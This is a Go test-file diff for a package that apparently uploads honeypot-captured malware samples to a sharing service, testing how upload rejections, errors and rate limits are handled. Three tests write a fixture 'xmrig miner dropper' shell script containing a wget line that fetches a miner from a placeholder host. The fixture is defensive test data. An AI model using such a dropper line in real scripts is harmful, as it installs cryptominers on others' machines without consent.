@@ -2,10 +2,12 @@ package bazaar
 
 import (
 	"context"
+	"errors"
 	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -339,6 +341,174 @@ func TestShareFatalRejectionStops(t *testing.T) {
 	}
 	if calls != 1 {
 		t.Errorf("want 1 call before halt, got %d", calls)
+	}
+}
+
+func TestShareSemanticRejections(t *testing.T) {
+	tests := []struct {
+		status    string
+		wantCalls int32
+		fatal     bool
+	}{
+		{status: "no_api_key", wantCalls: 1, fatal: true},
+		{status: "user_blacklisted", wantCalls: 1, fatal: true},
+		{status: "http_post_expected", wantCalls: 2},
+		{status: "file_expected", wantCalls: 2},
+		{status: "file_too_large", wantCalls: 2},
+		{status: "file_type_not_allowed", wantCalls: 2},
+		{status: "", wantCalls: 2},
+		{status: "future_status", wantCalls: 2},
+	}
+
+	for _, tt := range tests {
+		name := tt.status
+		if name == "" {
+			name = "empty"
+		}
+		t.Run(name, func(t *testing.T) {
+			payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
+			path := filepath.Join(t.TempDir(), "dropper.sh")
+			if err := os.WriteFile(path, payload, 0o600); err != nil {
+				t.Fatal(err)
+			}
+
+			var calls atomic.Int32
+			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+				calls.Add(1)
+				_, _ = w.Write([]byte(`{"query_status":` + strconv.Quote(tt.status) + `}`))
+			}))
+			defer srv.Close()
+
+			fresh := time.Now()
+			cands := []Candidate{
+				{SHA256: "a", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+				{SHA256: "b", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+			}
+			rec := newMemRecorder()
+			uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
+				APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
+			})
+			if err == nil {
+				t.Fatalf("semantic rejection %q returned nil error", tt.status)
+			}
+			if uploaded != 0 || skipped != int(tt.wantCalls) {
+				t.Fatalf("counts = (%d uploaded, %d skipped), want (0, %d)", uploaded, skipped, tt.wantCalls)
+			}
+			if got := calls.Load(); got != tt.wantCalls {
+				t.Fatalf("calls = %d, want %d for status %q", got, tt.wantCalls, tt.status)
+			}
+			if tt.status != "" && !strings.Contains(err.Error(), tt.status) {
+				t.Fatalf("error %q does not identify status %q", err, tt.status)
+			}
+			var semanticErr *SemanticError
+			if !errors.As(err, &semanticErr) {
+				t.Fatalf("error %T is not *SemanticError: %v", err, err)
+			}
+			if semanticErr.Status != tt.status || semanticErr.Fatal() != tt.fatal {
+				t.Fatalf("semantic error = (status=%q fatal=%v), want (%q, %v)", semanticErr.Status, semanticErr.Fatal(), tt.status, tt.fatal)
+			}
+			if len(rec.records) != 0 {
+				t.Fatalf("rejected samples were recorded: %+v", rec.records)
+			}
+		})
+	}
+}
+
+func TestShareFatalSemanticRejectionRetainedAfterPriorError(t *testing.T) {
+	payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
+	path := filepath.Join(t.TempDir(), "dropper.sh")
+	if err := os.WriteFile(path, payload, 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	var calls atomic.Int32
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		if calls.Add(1) == 1 {
+			http.Error(w, "prior transport failure", http.StatusBadGateway)
+			return
+		}
+		_, _ = w.Write([]byte(`{"query_status":"no_api_key"}`))
+	}))
+	defer srv.Close()
+
+	fresh := time.Now()
+	cands := []Candidate{
+		{SHA256: "transport-error", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+		{SHA256: "fatal-rejection", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+	}
+	rec := newMemRecorder()
+	uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
+		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: time.Millisecond,
+	})
+	if uploaded != 0 || skipped != 1 {
+		t.Fatalf("counts = (%d uploaded, %d skipped), want (0, 1)", uploaded, skipped)
+	}
+	if got := calls.Load(); got != 2 {
+		t.Fatalf("calls = %d, want 2", got)
+	}
+	if err == nil || !strings.Contains(err.Error(), "http 502") {
+		t.Fatalf("error = %v, want prior transport error", err)
+	}
+	var semanticErr *SemanticError
+	if !errors.As(err, &semanticErr) || semanticErr.Status != "no_api_key" || !semanticErr.Fatal() {
+		t.Fatalf("error = %v, want fatal no_api_key SemanticError", err)
+	}
+	if len(rec.records) != 0 {
+		t.Fatalf("rejected samples were recorded: %+v", rec.records)
+	}
+}
+
+func TestSharePacesAfterNonfatalSemanticRejection(t *testing.T) {
+	payload := []byte("#!/bin/sh\n# xmrig miner dropper\nwget http://example.test/xmrig\n" + strings.Repeat("# padding\n", 8))
+	path := filepath.Join(t.TempDir(), "dropper.sh")
+	if err := os.WriteFile(path, payload, 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	var calls atomic.Int32
+	var timesMu sync.Mutex
+	var requestTimes []time.Time
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		call := calls.Add(1)
+		timesMu.Lock()
+		requestTimes = append(requestTimes, time.Now())
+		timesMu.Unlock()
+		if call == 1 {
+			_, _ = w.Write([]byte(`{"query_status":"file_too_large"}`))
+			return
+		}
+		_, _ = w.Write([]byte(`{"query_status":"inserted"}`))
+	}))
+	defer srv.Close()
+
+	fresh := time.Now()
+	cands := []Candidate{
+		{SHA256: "rejected", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+		{SHA256: "accepted", LocalPath: path, SizeBytes: int64(len(payload)), CreatedAt: fresh, Origin: "cowrie_download", ObservedAt: fresh},
+	}
+	rec := newMemRecorder()
+	const rateLimit = 25 * time.Millisecond
+	uploaded, skipped, err := Share(context.Background(), rec, cands, Options{
+		APIKey: "k", Endpoint: srv.URL, MaxBytes: 1 << 20, RateLimit: rateLimit,
+	})
+	var semanticErr *SemanticError
+	if !errors.As(err, &semanticErr) || semanticErr.Status != "file_too_large" {
+		t.Fatalf("error = %v, want file_too_large SemanticError", err)
+	}
+	if uploaded != 1 || skipped != 1 {
+		t.Errorf("counts = (%d uploaded, %d skipped), want (1, 1)", uploaded, skipped)
+	}
+	if len(rec.records) != 1 || rec.records[0].sha != "accepted" {
+		t.Errorf("records = %+v, want only accepted candidate", rec.records)
+	}
+	timesMu.Lock()
+	times := append([]time.Time(nil), requestTimes...)
+	timesMu.Unlock()
+	if len(times) != 2 {
+		t.Fatalf("request times = %v, want two POSTs", times)
+	}
+	if gap := times[1].Sub(times[0]); gap < rateLimit {
+		t.Errorf("inter-request gap = %v, want at least %v", gap, rateLimit)
 	}
 }
 
